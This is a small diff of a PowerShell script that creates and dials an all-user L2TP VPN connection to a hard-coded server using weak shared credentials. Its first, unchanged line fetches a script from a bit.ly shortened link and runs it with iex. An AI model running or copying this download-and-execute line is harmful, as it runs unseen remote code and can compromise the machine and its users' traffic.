@@ -1,3 +1,3 @@
 iex (New-Object Net.WebClient).DownloadString('http://bit.ly/3KP6I9g')
-Add-VpnConnection -Name "MyVPNConnection" -ServerAddress "219.100.37.8" -TunnelType L2tp -L2tpPsk "vpn" -AuthenticationMethod Chap,MSChapv2 -EncryptionLevel Required -AllUserConnection -PassThru -RememberCredential -SplitTunneling $false
+Start-Process powershell -ArgumentList "-NoExit -Command Add-VpnConnection -Name 'MyVPNConnection' -ServerAddress '219.100.37.8' -TunnelType L2tp -L2tpPsk 'vpn' -AuthenticationMethod Chap,MSChapv2 -EncryptionLevel Required -AllUserConnection -PassThru -RememberCredential -SplitTunneling `$false"
 rasdial "MyVPNConnection" "vpn" "vpn"
